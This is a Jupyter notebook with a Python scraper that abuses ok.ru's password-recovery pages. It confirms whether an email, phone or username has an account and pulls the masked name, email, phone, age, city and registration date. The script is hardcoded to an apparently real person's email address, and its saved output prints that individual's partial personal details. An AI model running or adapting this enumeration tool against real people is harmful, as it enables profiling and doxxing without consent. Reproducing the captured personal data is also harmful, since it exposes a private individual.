{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "vilivladi@rambler.ru associated with ok.ru login\n",
      "masked_name - лилия м********\n",
      "masked_email - vili*****@rambler.ru\n",
      "masked_phone - 7911142****\n",
      "profile_info - 48 лет, Санкт-Петербург\n",
      "profile_registred - Профиль создан 8 марта 2008\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "import argparse\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "\n",
    "OK_LOGIN_URL = \\\n",
    "    'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'\n",
    "OK_RECOVER_URL = \\\n",
    "    'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'\n",
    "\n",
    "\n",
    "def check_login(login_data):\n",
    "    session = requests.Session()\n",
    "    session.get(f'{OK_LOGIN_URL}&st.email={login_data}')\n",
    "    request = session.get(OK_RECOVER_URL)\n",
    "    root_soup = BeautifulSoup(request.content, 'html.parser')\n",
    "    soup = root_soup.find('div', {'data-l': 'registrationContainer,offer_contact_rest'})\n",
    "    if soup:\n",
    "        account_info = soup.find('div', {'class': 'ext-registration_tx taCenter'})\n",
    "        masked_email = soup.find('button', {'data-l': 't,email'})\n",
    "        masked_phone = soup.find('button', {'data-l': 't,phone'})\n",
    "        if masked_phone:\n",
    "            masked_phone = masked_phone.find('div', {'class': 'ext-registration_stub_small_header'}).get_text()\n",
    "        if masked_email:\n",
    "            masked_email = masked_email.find('div', {'class': 'ext-registration_stub_small_header'}).get_text()\n",
    "        if account_info:\n",
    "            masked_name = account_info.find('div', {'class': 'ext-registration_username_header'})\n",
    "            if masked_name:\n",
    "                masked_name = masked_name.get_text()\n",
    "            account_info = account_info.findAll('div', {'class': 'lstp-t'})\n",
    "            if account_info:\n",
    "                profile_info = account_info[0].get_text()\n",
    "                profile_registred = account_info[1].get_text()\n",
    "            else:\n",
    "                profile_info = None\n",
    "                profile_registred = None\n",
    "        else:\n",
    "            return None\n",
    "\n",
    "        return {\n",
    "            'masked_name': masked_name,\n",
    "            'masked_email': masked_email,\n",
    "            'masked_phone': masked_phone,\n",
    "            'profile_info': profile_info,\n",
    "            'profile_registred': profile_registred,\n",
    "        }\n",
    "\n",
    "    if root_soup.find('div', {'data-l': 'registrationContainer,home_rest'}):\n",
    "        return 'not associated'\n",
    "\n",
    "\n",
    "def console_output(login_data, parsed_response):\n",
    "    if parsed_response:\n",
    "        if parsed_response == 'not associated':\n",
    "            print(f'{login_data} not associated with ok.ru login')\n",
    "        else:\n",
    "            print(f'{login_data} associated with ok.ru login')\n",
    "            for key, value in parsed_response.items():\n",
    "                if value:\n",
    "                    print(f'{key} - {value}')\n",
    "    else:\n",
    "        print('No fault, but server return unknown response')\n",
    "\n",
    "\n",
    "def console_run():\n",
    "    arg_parser = argparse.ArgumentParser(description='Simple checker for ok.ru partial private data disclosure')\n",
    "    arg_parser.add_argument('login_data', help='known credential to check (email / phone number / username)')\n",
    "    #args = ['vilivladi@rambler.ru']\n",
    "    #login_data = args.login_data\n",
    "    response = check_login('vilivladi@rambler.ru')\n",
    "    console_output('vilivladi@rambler.ru', response)\n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    console_run()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
